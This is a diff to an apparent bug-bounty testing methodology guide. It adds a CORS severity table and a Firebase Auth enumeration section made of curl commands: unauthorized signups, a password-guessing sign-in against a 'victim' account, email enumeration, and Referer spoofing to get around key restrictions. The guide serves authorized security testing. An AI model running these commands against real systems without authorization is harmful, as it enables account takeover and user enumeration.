@@ -116,6 +116,11 @@ done
 # 4. Cloud storage enumeration
 # Check for S3/Spaces bucket listing on discovered subdomains
 curl -s "https://subdomain.target.com" | grep -i "ListBucket\|AccessDenied\|NoSuchBucket"
+
+# 5. Token format oracle on unauthenticated endpoints
+# See references/token-format-oracle.md for full technique
+# Test token-based endpoints (email confirm, withdrawal approve, password reset)
+# with varying lengths to identify format validation oracles
 ```
 
 ### 1. Automated Vulnerability Scanning (nuclei — skip if CDN-blocked)
@@ -168,7 +173,31 @@ searchsploit "nginx"
 # Cross-reference: service version from Phase 2 → known CVEs → exploitability
 ```
 
-### 5. CORS Origin Reflection Testing (MANDATORY)
+### CORS Severity Quick-Reference
+
+Before reporting CORS findings, assess actual impact:
+
+| Configuration | Severity | Rationale |
+|--------------|----------|-----------|
+| `ACAO: *` (no credentials) | **Low/Info** | Only leaks data accessible without cookies. Most programs won't pay for this. |
+| `ACAO: *` + debug traces/errors | **Low-Medium** | Leaks internal architecture cross-origin, but no user data |
+| `ACAO: attacker.com` + `ACAC: true` | **High** | Reads authenticated responses cross-origin — real ATO vector |
+| `ACAO: null` + `ACAC: true` | **High** | Exploitable via sandboxed iframe |
+| `ACAO: *.same-domain.com` (subdomain only) | **Medium** | Requires XSS on a subdomain to exploit |
+
+**Key rule:** `Access-Control-Allow-Origin: *` WITHOUT `Access-Control-Allow-Credentials: true` = **Low at best**. Browsers won't send cookies with `*`, so the attacker only reads public data. Many programs explicitly exclude this. Check program policy before investing time.
+
+**When CORS `*` IS reportable:**
+- Combined with debug mode (leaks internal paths/schema cross-origin)
+- On an endpoint that returns different data based on IP/geo (not cookie-based auth)
+- When the response contains sensitive data that's "public" but shouldn't be cross-origin readable (e.g., internal error messages)
+
+**When to skip CORS `*`:**
+- All responses are the same regardless of auth state
+- Data is truly public (marketing content, public API)
+- Program explicitly excludes "CORS misconfiguration without demonstrated impact"
+
+### CORS Origin Reflection Testing (MANDATORY)
 
 Test ALL endpoints that return sensitive data or perform state-changing actions:
 
@@ -194,6 +223,50 @@ curl -sk -H "Origin: https://eviltarget.com" "$ENDPOINT" -D- | grep -i "access-c
 - Reflected origin + `Access-Control-Allow-Credentials: true` + endpoint returns sensitive data = **High** (cross-origin data theft)
 - Reflected origin without credentials = **Low** (limited to non-credentialed requests)
 - Wildcard `*` without credentials = **Info** (by design for public APIs)
+
+### 5b. Firebase Auth Provider Enumeration (MANDATORY when Firebase detected)
+
+When Firebase Auth is in use, test ALL sign-in providers — apps often enable password auth but only use email-link in the UI:
+
+```bash
+# 1. Test password signup (most common misconfiguration)
+curl -sk -H "Referer: https://TARGET/" \
+  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=FIREBASE_API_KEY" \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"email":"test@attacker.com","password":"Test123456!","returnSecureToken":true}'
+# VULN if: returns idToken with sign_in_provider: "password" when app only uses emailLink
+
+# 2. Test anonymous signup
+curl -sk -H "Referer: https://TARGET/" \
+  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=FIREBASE_API_KEY" \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"returnSecureToken":true}'
+# VULN if: returns idToken (anonymous auth enabled)
+
+# 3. Test signInWithPassword on existing accounts
+curl -sk -H "Referer: https://TARGET/" \
+  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=FIREBASE_API_KEY" \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"email":"victim@target.com","password":"common_pass","returnSecureToken":true}'
+
+# 4. Check createAuthUri (email enumeration)
+curl -sk -H "Referer: https://TARGET/" \
+  "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=FIREBASE_API_KEY" \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"identifier":"test@target.com","continueUri":"https://TARGET/login"}'
+# Returns registered: true/false
+
+# 5. Decode JWT claims to verify bypass
+echo "$ID_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
+# Check: firebase.sign_in_provider, email_verified, auth_time
+```
+
+**Impact assessment:**
+- Password auth enabled on passwordless-only app = **Medium-High** (auth flow bypass, account squatting, KYC bypass on regulated platforms)
+- Anonymous auth enabled = **Medium** (unlimited account creation)
+- Email enumeration via createAuthUri = **Low** (often excluded by programs)
+
+**Key insight:** Firebase API keys are referer-restricted, NOT secret. Always add `-H "Referer: https://TARGET/"` to bypass the restriction. The API key + referer = full access to Identity Toolkit.
 
 ### 6. OAuth/OIDC redirect_uri Validation (MANDATORY)
 
